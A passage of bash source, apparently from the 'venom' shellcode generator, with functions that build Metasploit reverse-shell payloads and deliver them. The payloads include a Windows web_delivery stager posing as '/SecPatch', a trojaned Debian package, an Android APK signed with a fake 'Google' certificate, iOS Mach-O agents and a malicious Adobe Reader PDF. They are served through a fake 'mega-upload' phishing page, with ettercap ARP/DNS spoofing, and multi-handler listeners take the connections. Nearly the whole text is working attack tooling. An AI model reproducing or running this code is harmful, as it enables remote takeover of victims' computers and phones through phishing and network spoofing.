exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $filename-$srvhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $ApAcHe/$filename.bat > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\nfi\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_multi_menu\n  clear\nfi\n}\n\n\n\n\n\n# ----------------------------------------\n# kimi - Malicious Debian Packet Creator\n# author: Chaitanya Haritash (SSA-RedTeam)\n# ----------------------------------------\nsh_shellcode20 () {\n# get user input to build the payload\necho \"[☠] Enter shellcode settings!\"\nsrvhost=$(zenity --title=\"☠ Enter SRVHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: Chaitanya\" --width 300) > /dev/null 2>&1\nVeRp=$(zenity --entry --title \"☠ DEBIAN PACKET VERSION ☠\" --text \"example: 1.0.13\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$srvhost\" ]; then srvhost=\"$IP\";fi\nif [ -z \"$VeRp\" ]; then VeRp=\"1.0.13\";fi\nif [ -z \"$N4m\" ]; then N4m=\"Chaitanya\";fi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    SRVPORT : 8080\n    SRVHOST : $srvhost\n    FORMAT  : SH,PYTHON -> UNIX(s)\n    PAYLOAD : python/meterpreter/reverse_tcp\n    AGENT   : $IPATH/output/$N4m.deb\n\n!\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files ..\"\nsleep 2\n\n\n   # check if kimi.py exists\n   if [ -e $IPATH/templates/kimi_MDPC/kimi.py ]; then\n      echo \"[☠] MDPC-kimi.py -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] MDPC-kimi.py -> not found!\"\n      exit\n   fi\n\n\n# use MDPC to build trojan agent\necho \"[☠] Use MDPC-kimi to build agent ..\"\nsleep 2\ncd $IPATH/templates/kimi_MDPC\nif [ \"$ArCh\" = \"x64\" ]; then\nxterm -T \"kimi.py (MDPC)\" -geometry 110x23 -e \"python kimi.py -n $N4m -V $VeRp -l $srvhost -a amd64 && sleep 2\" > /dev/null 2>&1\nelse\nxterm -T \"kimi.py (MDPC)\" -geometry 110x23 -e \"python kimi.py -n $N4m -V $VeRp -l $srvhost -a i386 && sleep 2\" > /dev/null 2>&1\nfi\n# move agent to the rigth directory (venom)\necho \"[☠] Moving agent to output folder ..\"\nsleep 2\nmv *.deb $IPATH/output/$N4m.deb > /dev/null 2>&1\nmv handler.rc $IPATH/output/handler.rc > /dev/null 2>&1\ncd $IPATH/\n\n\n# copy agent to apache2 and deliver it to target\necho \"[☠] Execute in target: sudo dpkg -i $N4m.deb\"\nsleep 2\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.deb\\n\\nchose how to deliver: $N4m.deb\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n      xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -r $IPATH/output/handler.rc\"\n      sleep 2\n\n   else\n\n\n      # edit files nedded\n      echo \"[☠] copy files to webroot...\"\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.deb|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.deb $ApAcHe/$N4m.deb > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.deb|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.deb $ApAcHe/$N4m.deb\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n        xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -r $IPATH/output/handler.rc\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$srvhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n        xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -r $IPATH/output/handler.rc\"\n\n        fi\n   fi\n\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.deb > /dev/null 2>&1\nclear\ncd $IPATH/\n# limpar /usr/local/bin in target on exit\n# rm /usr/local/bin/$N4m > /dev/null 2>&1\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_unix_menu\n  clear\nfi\n}\n\n\n\n\n\n# -----------------------------\n# Android payload \n# ----------------------------- \nsh_shellcode21 () {\n\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: SignApk\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"SignApk\";fi\n\necho \"[☠] Building shellcode -> DALVIK format ...\"\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : DALVIK -> ANDROID\n    PAYLOAD : android/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode (msf encoded)\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a dalvik --platform Android -f raw > $IPATH/output/$N4m.apk\"\nsleep 2\n\n\n## Sign apk application (certificate)\necho -n \"${BlueF}[${GreenF}➽${BlueF}]${white} Do you wish to sign $N4m.apk Appl (y|n)?:${Reset}\";read cert\nif [ \"$cert\" = \"y\" ] || [ \"$cert\" = \"Y\" ] || [ \"$cert\" = \"yes\" ]; then\n   imp=`which keytool`\n   if [ \"$?\" -eq \"0\" ]; then\n      echo \"[☠] Signing $N4m.apk using keytool ..\";sleep 1\n      echo \"[☠] keytool install found (dependencie)..\";sleep 1\n      cd $IPATH/output\n      imp=`which zipalign`\n      if [ \"$?\" -eq \"0\" ]; then\n         echo \"[☠] zipalign install found (dependencie)..\";sleep 1\n      else\n         echo \"${RedF}[x]${white} 'zipalign' packet NOT found (installing)..\";sleep 2\n         echo \"\";sudo apt-get install zipalign;echo \"\"\n      fi\n\n      ## Sign (SSL certificate) apk Banner\n      # https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/\n      echo \"---\"\n      echo \"- ${YellowF}Android Apk Certificate Function:${Reset}\"\n      echo \"- After Successfully created the .apk file, we need to sign an certificate to it,\"\n      echo \"- because Android mobile devices are not allowing the installing of apps without\"\n      echo \"- the signed certificate. This function uses (keytool | jarsigner | zipalign) to\"\n      echo \"- sign our apk with an SSL certificate (google). We just need to manually input 3\"\n      echo \"- times a SecretKey (password) when asked further head.\"\n      echo \"---\"\n      keytool -genkey -v -keystore $IPATH/output/my-release-key.Keystore -alias $N4m -keyalg RSA -keysize 2048 -validity 10000 -dname \"CN=Android, OU=Google, O=Google, L=US, ST=NY, C=US\";echo \"\";sleep 2\n      jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $IPATH/output/my-release-key.Keystore $N4m.apk $N4m;sleep 2;echo \"\"\n      zipalign -v 4 $IPATH/output/$N4m.apk $IPATH/output/done.apk;sleep 1;echo \"\"\n      mv done.apk $Nam.apk > /dev/null 2>&1\n      cd $IPATH\n   else\n      echo \"${RedF}[x]${white} Abort, ${RedF}keytool${white} packet not found..\";sleep 1\n      echo \"[☠] Please Install 'keytool' packet before continue ..\";sleep 3\n      sh_android_menu # <--- return to android/ios menu\n   fi\nfi\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.apk\\n\\nchose how to deliver: $N4m.apk\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n        fi\n      sleep 2\n\n   else\n\n      # edit files nedded\n      echo \"[☠] Porting ALL files to apache2 webroot...\";sleep 1\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.apk|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.apk $ApAcHe/$N4m.apk > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\";sleep 1\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.apk|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.apk $ApAcHe/$N4m.apk\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           cd $IPATH/output\n           # delete utf-8/non-ancii caracters from output\n           tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n           sed -i \"s/\\[0m//g\" final.log\n           sed -i \"s/\\[1m\\[34m//g\" final.log\n           sed -i \"s/\\[4m//g\" final.log\n           sed -i \"s/\\[K//g\" final.log\n           sed -i \"s/\\[1m\\[31m//g\" final.log\n           sed -i \"s/\\[1m\\[32m//g\" final.log\n           sed -i \"s/\\[1m\\[33m//g\" final.log\n           mv final.log $N4m-$lhost.log > /dev/null 2>&1\n           rm report.log > /dev/null 2>&1\n           cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n          fi\n        fi\n   fi\n\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.apk > /dev/null 2>&1\nrm $IPATH/output/.apk > /dev/null 2>&1\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_android_menu\n  clear\nfi\n}\n\n\n\n\n\n#\n# IOS payload | macho\n#\nsh_macho () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"osx/armle/shell_reverse_tcp\" FALSE \"osx/x64/meterpreter/reverse_tcp\" FALSE \"apple_ios/aarch64/meterpreter_reverse_tcp\" --width 400 --height 250) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: IosPayload\" --width 300) > /dev/null 2>&1\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"IosPayload\";fi\n\necho \"[☠] Building shellcode -> MACHO format ..\"\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : MACHO -> IOS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode (msf encoded)\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f macho > $IPATH/output/$N4m.macho\"\nsleep 2\necho \"[☠] armle payload build (IOS).\"\nsleep 1\necho \"[☠] Give execution permitions to agent ..\"\nchmod +x $IPATH/output/$N4m.macho > /dev/null 2>&1\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.macho\\n\\nchose how to deliver: $N4m.macho\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n        fi\n      sleep 2\n\n   else\n\n      # edit files nedded\n      echo \"[☠] copy files to webroot...\"\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.macho|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.macho $ApAcHe/$N4m.macho > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.macho|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.macho $ApAcHe/$N4m.macho\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           cd $IPATH/output\n           # delete utf-8/non-ancii caracters from output\n           tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n           sed -i \"s/\\[0m//g\" final.log\n           sed -i \"s/\\[1m\\[34m//g\" final.log\n           sed -i \"s/\\[4m//g\" final.log\n           sed -i \"s/\\[K//g\" final.log\n           sed -i \"s/\\[1m\\[31m//g\" final.log\n           sed -i \"s/\\[1m\\[32m//g\" final.log\n           sed -i \"s/\\[1m\\[33m//g\" final.log\n           mv final.log $N4m-$lhost.log > /dev/null 2>&1\n           rm report.log > /dev/null 2>&1\n           cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n   fi\n\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.macho > /dev/null 2>&1\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_android_menu\n  clear\nfi\n}\n\n\n\n\n# -----------------------------\n# Android PDF payload \n# ----------------------------- \nsh_android_pdf () {\n\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ FILENAME ☠\" --text \"Enter payload output name\\nexample: vacations\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"vacations\";fi\n\necho \"[☠] Building shellcode -> Android ARM format ...\"\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : Android ARM -> ANDROID\n    PAYLOAD : android/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode (msf encoded)\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/android/fileformat/adobe_reader_pdf_js_interface; set LHOST $lhost; set LPORT $lport; set FILENAME $N4m.pdf; exploit; exit -y'\"\nmv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf\nsleep 2\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.pdf\\n\\nchose how to deliver: $N4m.pdf\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n        fi\n      sleep 2\n\n   else\n\n      # edit files nedded\n      echo \"[☠] copy files to webroot...\"\n      cd $IPATH/output\n      zip $N4m.zip $N4m.pdf > /dev/null 2>&1\n      cd $IPATH\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed 